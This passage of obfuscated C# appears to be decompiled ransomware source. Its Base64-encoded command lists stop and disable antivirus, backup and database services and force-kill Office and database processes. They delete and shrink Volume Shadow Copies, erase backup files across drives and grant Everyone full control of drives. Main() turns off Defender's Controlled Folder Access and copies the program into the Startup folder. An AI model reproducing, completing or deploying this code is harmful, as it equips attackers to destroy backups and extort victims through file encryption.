		bxMeQFfPcma("c3RvcCDigJxTeW1hbnRlYyBTeXN0ZW0gUmVjb3ZlcnnigJ0gL3k="),
		bxMeQFfPcma("c3RvcCBNU09MQVAkU1FMXzIwMDggL3k="),
		bxMeQFfPcma("c3RvcCBVSTBEZXRlY3QgL3k="),
		bxMeQFfPcma("c3RvcCBNU0V4Y2hhbmdlU0EgL3k="),
		bxMeQFfPcma("c3RvcCDigJxTb3Bob3MgRmlsZSBTY2FubmVyIFNlcnZpY2XigJ0gL3k="),
		bxMeQFfPcma("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTIC95"),
		bxMeQFfPcma("c3RvcCDigJxWZWVhbSBCYWNrdXAgQ2F0YWxvZyBEYXRhIFNlcnZpY2XigJ0gL3k="),
		bxMeQFfPcma("c3RvcCBNU09MQVAkU1lTVEVNX0JHQyAveQ=="),
		bxMeQFfPcma("c3RvcCBXM1N2YyAveQ=="),
		bxMeQFfPcma("c3RvcCBNU0V4Y2hhbmdlU1JTIC95"),
		bxMeQFfPcma("c3RvcCDigJxTb3Bob3MgSGVhbHRoIFNlcnZpY2XigJ0gL3k="),
		bxMeQFfPcma("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTQU1BIC95"),
		bxMeQFfPcma("c3RvcCDigJxab29seiAyIFNlcnZpY2XigJ0gL3k="),
		bxMeQFfPcma("c3RvcCBNU09MQVAkVFBTIC95"),
		bxMeQFfPcma("c3RvcCDigJxhcGhpZG1vbml0b3JzZXJ2aWNl4oCdIC95"),
		bxMeQFfPcma("c3RvcCBtc2V4Y2hhbmdlYWR0b3BvbG9neSAveQ=="),
		bxMeQFfPcma("c3RvcCDigJxTb3Bob3MgTUNTIEFnZW504oCdIC95"),
		bxMeQFfPcma("c3RvcCBBY3JTY2gyU3ZjIC95"),
		bxMeQFfPcma("c3RvcCBNU09MQVAkVFBTQU1BIC95"),
		bxMeQFfPcma("c3RvcCDigJxpbnRlbChyKSBwcm9zZXQgbW9uaXRvcmluZyBzZXJ2aWNl4oCdIC95"),
		bxMeQFfPcma("c3RvcCBtc2V4Y2hhbmdlaW1hcDQgL3k="),
		bxMeQFfPcma("c3RvcCDigJxTb3Bob3MgTUNTIENsaWVudOKAnSAveQ=="),
		bxMeQFfPcma("c3RvcCBBUlNNIC95"),
		bxMeQFfPcma("c3RvcCBNU1NRTCRCS1VQRVhFQyAveQ=="),
		bxMeQFfPcma("c3RvcCB1bmlzdG9yZXN2Y18xYWY0MGEgL3k="),
		bxMeQFfPcma("c3RvcCDigJxTb3Bob3MgTWVzc2FnZSBSb3V0ZXLigJ0gL3k="),
		bxMeQFfPcma("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		bxMeQFfPcma("c3RvcCBNU1NRTCRFQ1dEQjIgL3k="),
		bxMeQFfPcma("c3RvcCBhdWRpb2VuZHBvaW50YnVpbGRlciAveQ=="),
		bxMeQFfPcma("c3RvcCDigJxTb3Bob3MgU2FmZXN0b3JlIFNlcnZpY2XigJ0gL3k="),
		bxMeQFfPcma("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		bxMeQFfPcma("c3RvcCBNU1NRTCRQUkFDVElDRU1HVCAveQ=="),
		bxMeQFfPcma("c3RvcCDigJxTb3Bob3MgU3lzdGVtIFByb3RlY3Rpb24gU2VydmljZeKAnSAveQ=="),
		bxMeQFfPcma("c3RvcCBCYWNrdXBFeGVjRGV2aWNlTWVkaWFTZXJ2aWNlIC95"),
		bxMeQFfPcma("c3RvcCBNU1NRTCRQUkFDVFRJQ0VCR0MgL3k="),
		bxMeQFfPcma("c3RvcCDigJxTb3Bob3MgV2ViIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		bxMeQFfPcma("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		bxMeQFfPcma("c3RvcCBNU1NRTCRQUk9EIC95"),
		bxMeQFfPcma("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		bxMeQFfPcma("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		bxMeQFfPcma("c3RvcCBNU1NRTCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		bxMeQFfPcma("c3RvcCBBbnRpdmlydXMgL3k="),
		bxMeQFfPcma("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		bxMeQFfPcma("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC8="),
		bxMeQFfPcma("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC95"),
		bxMeQFfPcma("c3RvcCBBVlAgL3k="),
		bxMeQFfPcma("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		bxMeQFfPcma("c3RvcCBNU1NRTCRTSEFSRVBPSU5UIC95"),
		bxMeQFfPcma("c3RvcCBEQ0FnZW50IC95"),
		bxMeQFfPcma("c3RvcCBiZWRiZyAveQ=="),
		bxMeQFfPcma("c3RvcCBNU1NRTCRTUUxfMjAwOCAveQ=="),
		bxMeQFfPcma("c3RvcCBFaHR0cFNydiAveQ=="),
		bxMeQFfPcma("c3RvcCBNTVMgL3k="),
		bxMeQFfPcma("c3RvcCBNU1NRTCRTUUxFWFBSRVNTIC95"),
		bxMeQFfPcma("c3RvcCBla3JuIC95"),
		bxMeQFfPcma("c3RvcCBtb3p5cHJvYmFja3VwIC95"),
		bxMeQFfPcma("c3RvcCBNU1NRTCRTWVNURU1fQkdDIC95"),
		bxMeQFfPcma("c3RvcCBFUFNlY3VyaXR5U2VydmljZSAveQ=="),
		bxMeQFfPcma("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		bxMeQFfPcma("c3RvcCBNU1NRTCRUUFMgL3k="),
		bxMeQFfPcma("c3RvcCBFUFVwZGF0ZVNlcnZpY2UgL3k="),
		bxMeQFfPcma("c3RvcCBudHJ0c2NhbiAveQ=="),
		bxMeQFfPcma("c3RvcCBNU1NRTCRUUFNBTUEgL3k="),
		bxMeQFfPcma("c3RvcCBFc2dTaEtlcm5lbCAveQ=="),
		bxMeQFfPcma("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		bxMeQFfPcma("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		bxMeQFfPcma("c3RvcCBFU0hBU1JWIC95"),
		bxMeQFfPcma("c3RvcCBTRFJTVkMgL3k="),
		bxMeQFfPcma("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMTIgL3k="),
		bxMeQFfPcma("c3RvcCBGQV9TY2hlZHVsZXIgL3k="),
		bxMeQFfPcma("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		bxMeQFfPcma("c3RvcCBNU1NRTEZETGF1bmNoZXIkUFJPRlhFTkdBR0VNRU5UIC95"),
		bxMeQFfPcma("c3RvcCBLQVZGUyAveQ=="),
		bxMeQFfPcma("c3RvcCBTUUxXcml0ZXIgL3k="),
		bxMeQFfPcma("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0JTTU9OSVRPUklORyAveQ=="),
		bxMeQFfPcma("c3RvcCBLQVZGU0dUIC95"),
		bxMeQFfPcma("c3RvcCBWZWVhbUJhY2t1cFN2YyAveQ=="),
		bxMeQFfPcma("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0hBUkVQT0lOVCAveQ=="),
		bxMeQFfPcma("c3RvcCBrYXZmc3NscCAveQ=="),
		bxMeQFfPcma("c3RvcCBWZWVhbUJyb2tlclN2YyAveQ=="),
		bxMeQFfPcma("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1FMXzIwMDggL3k="),
		bxMeQFfPcma("c3RvcCBrbG5hZ2VudCAveQ=="),
		bxMeQFfPcma("c3RvcCBWZWVhbUNhdGFsb2dTdmMgL3k="),
		bxMeQFfPcma("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1lTVEVNX0JHQyAveQ=="),
		bxMeQFfPcma("c3RvcCBtYWNtbnN2YyAveQ=="),
		bxMeQFfPcma("c3RvcCBWZWVhbUNsb3VkU3ZjIC95"),
		bxMeQFfPcma("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTIC95"),
		bxMeQFfPcma("c3RvcCBtYXN2YyAveQ=="),
		bxMeQFfPcma("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		bxMeQFfPcma("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTQU1BIC95"),
		bxMeQFfPcma("c3RvcCBNQkFNU2VydmljZSAveQ=="),
		bxMeQFfPcma("c3RvcCBWZWVhbURlcGxveVN2YyAveQ=="),
		bxMeQFfPcma("c3RvcCBNU1NRTFNFUlZFUiAveQ=="),
		bxMeQFfPcma("c3RvcCBNQkVuZHBvaW50QWdlbnQgL3k="),
		bxMeQFfPcma("c3RvcCBWZWVhbUVudGVycHJpc2VNYW5hZ2VyU3ZjIC95"),
		bxMeQFfPcma("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyIC95"),
		bxMeQFfPcma("c3RvcCBNY0FmZWVFbmdpbmVTZXJ2aWNlIC95"),
		bxMeQFfPcma("c3RvcCBWZWVhbUh2SW50ZWdyYXRpb25TdmMgL3k="),
		bxMeQFfPcma("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyMTAwIC95"),
		bxMeQFfPcma("c3RvcCBNY0FmZWVGcmFtZXdvcmsgL3k="),
		bxMeQFfPcma("c3RvcCBWZWVhbU1vdW50U3ZjIC95"),
		bxMeQFfPcma("c3RvcCBNU1NRTFNlcnZlck9MQVBTZXJ2aWNlIC95"),
		bxMeQFfPcma("c3RvcCBNY0FmZWVGcmFtZXdvcmtNY0FmZWVGcmFtZXdvcmsgL3k="),
		bxMeQFfPcma("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		bxMeQFfPcma("c3RvcCBNeVNRTDU3IC95"),
		bxMeQFfPcma("c3RvcCBNY1NoaWVsZCAveQ=="),
		bxMeQFfPcma("c3RvcCBWZWVhbVJFU1RTdmMgL3k="),
		bxMeQFfPcma("c3RvcCBNeVNRTDgwIC95"),
		bxMeQFfPcma("c3RvcCBNY1Rhc2tNYW5hZ2VyIC95"),
		bxMeQFfPcma("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		bxMeQFfPcma("c3RvcCBPcmFjbGVDbGllbnRDYWNoZTgwIC95"),
		bxMeQFfPcma("c3RvcCBtZmVmaXJlIC95"),
		bxMeQFfPcma("c3RvcCB3YmVuZ2luZSAveQ=="),
		bxMeQFfPcma("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		bxMeQFfPcma("c3RvcCBtZmVtbXMgL3k="),
		bxMeQFfPcma("c3RvcCB3YmVuZ2luZSAveQ=="),
		bxMeQFfPcma("c3RvcCBSRVN2YyAveQ=="),
		bxMeQFfPcma("c3RvcCBtZmV2dHAgL3k="),
		bxMeQFfPcma("c3RvcCBzbXNfc2l0ZV9zcWxfYmFja3VwIC95"),
		bxMeQFfPcma("c3RvcCBTUUxBZ2VudCRCS1VQRVhFQyAveQ=="),
		bxMeQFfPcma("c3RvcCBNU1NRTCRTT1BIT1MgL3k="),
		bxMeQFfPcma("c3RvcCBTUUxBZ2VudCRDSVRSSVhfTUVUQUZSQU1FIC95"),
		bxMeQFfPcma("c3RvcCBzYWNzdnIgL3k="),
		bxMeQFfPcma("c3RvcCBTUUxBZ2VudCRDWERCIC95"),
		bxMeQFfPcma("c3RvcCBTQVZBZG1pblNlcnZpY2UgL3k="),
		bxMeQFfPcma("c3RvcCBTUUxBZ2VudCRFQ1dEQjIgL3k="),
		bxMeQFfPcma("c3RvcCBTQVZTZXJ2aWNlIC95"),
		bxMeQFfPcma("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VCR0MgL3k="),
		bxMeQFfPcma("c3RvcCBTZXBNYXN0ZXJTZXJ2aWNlIC95"),
		bxMeQFfPcma("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VNR1QgL3k="),
		bxMeQFfPcma("c3RvcCBTaE1vbml0b3IgL3k="),
		bxMeQFfPcma("c3RvcCBTUUxBZ2VudCRQUk9EIC95"),
		bxMeQFfPcma("c3RvcCBTbWNpbnN0IC95"),
		bxMeQFfPcma("c3RvcCBTUUxBZ2VudCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		bxMeQFfPcma("c3RvcCBTbWNTZXJ2aWNlIC95"),
		bxMeQFfPcma("c3RvcCBTUUxBZ2VudCRTQlNNT05JVE9SSU5HIC95"),
		bxMeQFfPcma("c3RvcCBTbnRwU2VydmljZSAveQ=="),
		bxMeQFfPcma("c3RvcCBTUUxBZ2VudCRTSEFSRVBPSU5UIC95"),
		bxMeQFfPcma("c3RvcCBzb3Bob3NzcHMgL3k="),
		bxMeQFfPcma("c3RvcCBTUUxBZ2VudCRTUUxfMjAwOCAveQ=="),
		bxMeQFfPcma("c3RvcCBTUUxBZ2VudCRTT1BIT1MgL3k="),
		bxMeQFfPcma("c3RvcCBTUUxBZ2VudCRTUUxFWFBSRVNTIC95"),
		bxMeQFfPcma("c3RvcCBzdmNHZW5lcmljSG9zdCAveQ=="),
		bxMeQFfPcma("c3RvcCBTUUxBZ2VudCRTWVNURU1fQkdDIC95"),
		bxMeQFfPcma("c3RvcCBzd2lfZmlsdGVyIC95"),
		bxMeQFfPcma("c3RvcCBTUUxBZ2VudCRUUFMgL3k="),
		bxMeQFfPcma("c3RvcCBzd2lfc2VydmljZSAveQ=="),
		bxMeQFfPcma("c3RvcCBTUUxBZ2VudCRUUFNBTUEgL3k="),
		bxMeQFfPcma("c3RvcCBzd2lfdXBkYXRlIC95"),
		bxMeQFfPcma("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		bxMeQFfPcma("c3RvcCBzd2lfdXBkYXRlXzY0IC95"),
		bxMeQFfPcma("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMTIgL3k="),
		bxMeQFfPcma("c3RvcCBUbUNDU0YgL3k="),
		bxMeQFfPcma("c3RvcCBTUUxCcm93c2VyIC95"),
		bxMeQFfPcma("c3RvcCB0bWxpc3RlbiAveQ=="),
		bxMeQFfPcma("c3RvcCBTUUxTYWZlT0xSU2VydmljZSAveQ=="),
		bxMeQFfPcma("c3RvcCBUcnVlS2V5IC95"),
		bxMeQFfPcma("c3RvcCBTUUxTRVJWRVJBR0VOVCAveQ=="),
		bxMeQFfPcma("c3RvcCBUcnVlS2V5U2NoZWR1bGVyIC95"),
		bxMeQFfPcma("c3RvcCBTUUxURUxFTUVUUlkgL3k="),
		bxMeQFfPcma("c3RvcCBUcnVlS2V5U2VydmljZUhlbHBlciAveQ=="),
		bxMeQFfPcma("c3RvcCBTUUxURUxFTUVUUlkkRUNXREIyIC95"),
		bxMeQFfPcma("c3RvcCBXUlNWQyAveQ=="),
		bxMeQFfPcma("c3RvcCBtc3NxbCR2aW1fc3FsZXhwIC95"),
		bxMeQFfPcma("c3RvcCB2YXBpZW5kcG9pbnQgL3k=")
	};

	public static List<string> FQmhLMNLFsJOmx = new List<string>
	{
		bxMeQFfPcma("Y29uZmlnIERuc2NhY2hlIHN0YXJ0PSBhdXRv"),
		bxMeQFfPcma("Y29uZmlnIEZEUmVzUHViIHN0YXJ0PSBhdXRv"),
		bxMeQFfPcma("Y29uZmlnIFNTRFBTUlYgc3RhcnQ9IGF1dG8="),
		bxMeQFfPcma("Y29uZmlnIHVwbnBob3N0IHN0YXJ0PSBhdXRv"),
		bxMeQFfPcma("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		bxMeQFfPcma("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		bxMeQFfPcma("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		bxMeQFfPcma("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> FXFLsRDLWGtpV = new List<string>
	{
		bxMeQFfPcma("L0lNIG1zcHViLmV4ZSAvRg=="),
		bxMeQFfPcma("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		bxMeQFfPcma("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		bxMeQFfPcma("L0lNIG15c3FsZC5leGUgL0Y="),
		bxMeQFfPcma("L0lNIHNxYmNvcmVzZXJ2aWNlLmV4ZSAvRg=="),
		bxMeQFfPcma("L0lNIGZpcmVmb3hjb25maWcuZXhlIC9G"),
		bxMeQFfPcma("L0lNIGFnbnRzdmMuZXhlIC9G"),
		bxMeQFfPcma("L0lNIHRoZWJhdC5leGUgL0Y="),
		bxMeQFfPcma("L0lNIHN0ZWFtLmV4ZSAvRg=="),
		bxMeQFfPcma("L0lNIGVuY3N2Yy5leGUgL0Y="),
		bxMeQFfPcma("L0lNIGV4Y2VsLmV4ZSAvRg=="),
		bxMeQFfPcma("L0lNIENOVEFvU01nci5leGUgL0Y="),
		bxMeQFfPcma("L0lNIHNxbHdyaXRlci5leGUgL0Y="),
		bxMeQFfPcma("L0lNIHRiaXJkY29uZmlnLmV4ZSAvRg=="),
		bxMeQFfPcma("L0lNIGRiZW5nNTAuZXhlIC9G"),
		bxMeQFfPcma("L0lNIHRoZWJhdDY0LmV4ZSAvRg=="),
		bxMeQFfPcma("L0lNIG9jb21tLmV4ZSAvRg=="),
		bxMeQFfPcma("L0lNIGluZm9wYXRoLmV4ZSAvRg=="),
		bxMeQFfPcma("L0lNIG1iYW10cmF5LmV4ZSAvRg=="),
		bxMeQFfPcma("L0lNIHpvb2x6LmV4ZSAvRg=="),
		bxMeQFfPcma("SU0gdGh1bmRlcmJpcmQuZXhlIC9G"),
		bxMeQFfPcma("L0lNIGRic25tcC5leGUgL0Y="),
		bxMeQFfPcma("L0lNIHhmc3N2Y2Nvbi5leGUgL0Y="),
		bxMeQFfPcma("L0lNIG1zcHViLmV4ZSAvRg=="),
		bxMeQFfPcma("L0lNIE50cnRzY2FuLmV4ZSAvRg=="),
		bxMeQFfPcma("L0lNIGlzcWxwbHVzc3ZjLmV4ZSAvRg=="),
		bxMeQFfPcma("L0lNIG9uZW5vdGUuZXhlIC9G"),
		bxMeQFfPcma("L0lNIFBjY05UTW9uLmV4ZSAvRg=="),
		bxMeQFfPcma("L0lNIG1zYWNjZXNzLmV4ZSAvRg=="),
		bxMeQFfPcma("L0lNIG91dGxvb2suZXhlIC9G"),
		bxMeQFfPcma("L0lNIHRtbGlzdGVuLmV4ZSAvRg=="),
		bxMeQFfPcma("L0lNIG1zZnRlc3FsLmV4ZSAvRg=="),
		bxMeQFfPcma("L0lNIHBvd2VycG50LmV4ZSAvRg=="),
		bxMeQFfPcma("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		bxMeQFfPcma("L0lNIHZpc2lvLmV4ZSAvRg=="),
		bxMeQFfPcma("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		bxMeQFfPcma("L0lNIHdpbndvcmQuZXhlIC9G"),
		bxMeQFfPcma("L0lNIG15c3FsZC1udC5leGUgL0Y="),
		bxMeQFfPcma("L0lNIHdvcmRwYWQuZXhlIC9G"),
		bxMeQFfPcma("L0lNIG15c3FsZC1vcHQuZXhlIC9G"),
		bxMeQFfPcma("L0lNIG9jYXV0b3VwZHMuZXhlIC9G"),
		bxMeQFfPcma("L0lNIG9jc3NkLmV4ZSAvRg=="),
		bxMeQFfPcma("L0lNIG9yYWNsZS5leGUgL0Y="),
		bxMeQFfPcma("L0lNIHNxbGFnZW50LmV4ZSAvRg=="),
		bxMeQFfPcma("L0lNIHNxbGJyb3dzZXIuZXhlIC9G"),
		bxMeQFfPcma("L0lNIHNxbHNlcnZyLmV4ZSAvRg=="),
		bxMeQFfPcma("L0lNIHN5bmN0aW1lLmV4ZSAvRg==")
	};

	public static List<string> vFMmAuIbZH = new List<string>
	{
		bxMeQFfPcma(cDwRmlrgXHB("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR")),
		bxMeQFfPcma("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
		bxMeQFfPcma("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
		bxMeQFfPcma("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
		bxMeQFfPcma("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
		bxMeQFfPcma("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
		bxMeQFfPcma("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
		bxMeQFfPcma("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		bxMeQFfPcma("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
		bxMeQFfPcma("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		bxMeQFfPcma("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		bxMeQFfPcma("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		bxMeQFfPcma("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		bxMeQFfPcma(cDwRmlrgXHB("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR"))
	};

	public static string JNUUWDNwLiV = bxMeQFfPcma("R2V0LVdtaU9iamVjdCBXaW4zMl9TaGFkb3djb3B5IHwgRm9yRWFjaC1PYmplY3QgeyAkX0RlbGV0ZSgpOyB9");

	public static List<string> xiUhukpsOtSGYr = new List<string>
	{
		bxMeQFfPcma("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		bxMeQFfPcma("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		bxMeQFfPcma("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		bxMeQFfPcma("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		bxMeQFfPcma("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		bxMeQFfPcma("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static List<string> IFUNyKmpHOsxN = new List<string>
	{
		bxMeQFfPcma("IkM6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		bxMeQFfPcma("IkQ6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		bxMeQFfPcma("Ilo6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E=")
	};

	public static string TZuJcVsXLNGeTxo = "NO";

	public static string SEwJViehzVYw = "NO";

	internal static DateTime cYXhPaZjERK = new DateTime(2000, 1, 1);

	internal static DateTime hqdhkxpMAJI = new DateTime(2100, 1, 1);

	public static string QYebiuGveQzf = "YES";

	public static string RZwhptcFPa = "10";

	public static string sgFuxaIBJFtlcuNd = "NO";

	public static string VKqONmoFhysUV = "NO";

	public static string LfHziMLIJbZCK = "NO";

	public static string LSOoGrDeAwlPVu = "NO";

	public static string nZETtphxpnDlZ = "NO";

	public static string vyQhuqfsME = "NO";

	public static List<string> hDIFdHdmiGRW = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string aQljRLcneiL = "NO";

	public static string DKFiWstOyiqUH = "1";

	public static string WxPwVGyuGvhq = "NO";

	public static string SjwzUIUdnzB = "NO";

	public static string XLzoldZPxtGo = "NO";

	public static string pJIFeGTEnHTkJVW = string.Empty;

	public static string oLTQIdhScwoG = "NO";

	public static string MJGpqmJuYZW = "NO";

	public static string yQmdClhqYggrTkaD = "NO";

	public static string oWEzKNlhjgFZ = "";

	public static string FLTwPNTzWOir = "";

	public static string XnoKlytRcAtsl = "NO";

	public static string sGQPzqRrgza = "YES";

	public static string DlXcPcbfAEzo = "NO";

	public static string wBMVJNyWNRQO = "NO";

	public static string OIGxWOVimWvU = "NO";

	public static string cYPKNGdSVCm = "LOGONISOFF";

	public static string vquscOddbEla = "NO";

	public static string JQADbjbsgOIHSwt = "NO";

	public static string nlqqbwYoua = "mystartup.lnk";

	public static string WNCjifyCxeOOO = "NO";

	public static string EXXetNZbuIeVu = "NO";

	public static string kqPrHpVCPyRCL = "NO";

	public static string SWmvUezVexv = "NO";

	public static string dwsxmebtOkGolRT = "VGhhbm9z";

	public static string fCZAYTYbzfs = "YES";

	public static string UiORXlGMsge = "NO";

	public static string EXpktDOoUSWEB = "NO";

	public static string wVGEXbUhIfm = "NO";

	public static string[] IkWLaiBGLuh = new string[0];

	public static string tdXPfZPVhETfyt = "NO";

	public static bool zYwzjEDkZQtaV = true;

	public static string ZZRJoJaDySUf = "NO";

	public static bool TiYWIzCfNH = false;

	public static bool hlyaNOgFlxSwE = false;

	public static bool nIbkuSiSRGMdUFD = false;

	public static bool gAhamSXrNZIE = false;

	public static string AycWHRRkQAZMoSL = "Debug_Log.txt";

	public static bool zHjohLaJRunF = false;

	public static bool eXCVVFKfst = false;

	public static bool GkiDwCfWnWUj = false;

	public static bool DLfPrQdkdIeFtqyQh = false;

	public static bool HvyOqSUDzaouQicF = true;

	public static string lhuIzAWzfr = "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + QtudfCYcVUfF.xNunMLmkCblXZVd() + ".txt";

	public static List<string> dFgtGfSIRupMkeT = new List<string>();

	public static List<string> AkmrKPQZtCLWb = new List<string>();

	public static List<string> xIuYjpCcqpNowbFz = new List<string>();

	private static void Main(string[] args)
	{
		try
		{
			string yCLDmttZzfTFy = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process p) => p.ProcessName == yCLDmttZzfTFy) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			dpvITeSaDTw.FVXDqUZalJsA(GZdyaPHHjBASItH);
		}
		catch (Exception)
		{
		}
		try
		{
			if (fCZAYTYbzfs == "YES")
			{
				Thread thread = new Thread(GnlZKXmmTJQ.FbVlyJuQpLN);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (tyEFYIpWFnddHYM == "YES")
		{
			Thread.Sleep(int.Parse(eCwoExENSsx));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && nZETtphxpnDlZ == "YES")
		{
			try
			{
				FHsNRUgrWA(bxMeQFfPcma("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="));
			}
			catch
			{
			}
		}
		try
		{
			if (WtKRHGUzoAXqFqa == "YES" && IhAexOOVYrys.FDCIZfyOdyJOqm())
			{
				new DFmNPAwKRyEQ().wFqbTQehcCDCkZ(SCLZzunrNdTK: false);
				IhAexOOVYrys.fTBRSnfvCNH();
			}
		}
		catch (Exception)
		{
		}
		if (PHjxHxoKCeaa == "YES" && IhAexOOVYrys.FDCIZfyOdyJOqm())
		{
			new DFmNPAwKRyEQ().wFqbTQehcCDCkZ(SCLZzunrNdTK: false);
			new DFmNPAwKRyEQ().jOLKGgmwXmx();
		}
		if (nRTGnZDeYR == "YES")
		{
			SyGZTQxvJIz.VcXyDhOwMSUW();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
			string text2 = text + Path.GetFileName(fileName);
